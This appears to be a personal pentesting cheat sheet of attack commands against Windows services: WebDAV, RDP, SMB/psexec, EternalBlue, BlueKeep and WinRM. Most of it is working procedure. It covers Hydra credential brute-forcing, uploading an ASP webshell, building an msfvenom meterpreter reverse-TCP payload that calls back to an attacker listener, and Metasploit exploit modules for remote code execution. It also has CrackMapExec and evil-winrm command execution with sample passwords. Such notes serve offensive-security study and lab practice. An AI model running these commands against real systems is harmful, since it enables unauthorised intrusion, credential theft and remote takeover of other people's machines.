# **Windows Vulnerabilities**

--------------------------------------------------------------------

## Micorosoft IIS

> .asp

> .aspx

> .config

> .php

--------------------------------------------------------------------

## WebDAV

> To connect to webDAV we need credentials

```
$ nmap scan -sV -sC

$ nmap -sV -p80 —script=http-enum

$ hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 0.0.0.0 http-get /webdav/
```


> tool davtest (scan, authenticate and exploit)
```
$ davtest -auth bob:password_123321 -url http://0.0.0.0/webdav
```

> tool cadaver (manipulating)
```
$ cadaver http://0.0.0.0/webdav
> username:
> password:
> put /usr/share/webshells/asp/webshell.asp
> dir C:\

$ ls -la /usr/share/webshells/asp (in this case asp is the one we can execute so)
```
> Metasploit
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 -f asp > shell.asp

upload it with cadaver

multi/handler

set payload windows/meterpreter/reverse_tcp (the same in the payload)

run the payload and wait on the handler

exploit/windows/iis/iis_webdav_upload_asp

set username and password
```

--------------------------------------------------------------------

### RDP: (bruteforce) 3389 normally

```
$ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit.framework/data/wordlists/unix_passwords.txt rdp://0.0.0.0 -s 3333 
> wait 1 minute to connect with the password
> xfreerdp /u: /p: /v:

auxiliary/scanner/rdp/rdp_scanner
> set strange port
```

--------------------------------------------------------------------

### Psexec: (bruteforce) smb

```
exploit/windows/smb/psexec

set windows/x64/meterpreter/reverse_tcp

we can use the hash obtained before or the password obtained by smb_login
```

--------------------------------------------------------------------

### EternalBlue: smb

```
$ nmap -p445 —script smb-vuln-ms17-010 0.0.0.0 
```

--------------------------------------------------------------------

### BlueKeep: (rdp) execute code

```
auxiliary/scanner/rdp/cve_2019_0708_bluekeep 

> use this first to check wether it is vulnerable and later use the exploit

auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce

set target (windows version)
```

--------------------------------------------------------------------

### WinRM:
> winrm = remote management protocol can be used to facilitate remote acces with windows systems (http = 5985, https = 5986)

```
$ crackmapexec winrm 0.0.0.0 -u administrator /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

$ crackmapexec winrm 0.0.0.0 -u administrator -p tinkerbell -x “whoami”

$ evil-winrm.rb -u administrator -p ‘tinkerbell’ -i 0.0.0.0

exploit/windows/winrm/winrm_script_exec
> set Force_vns true
```
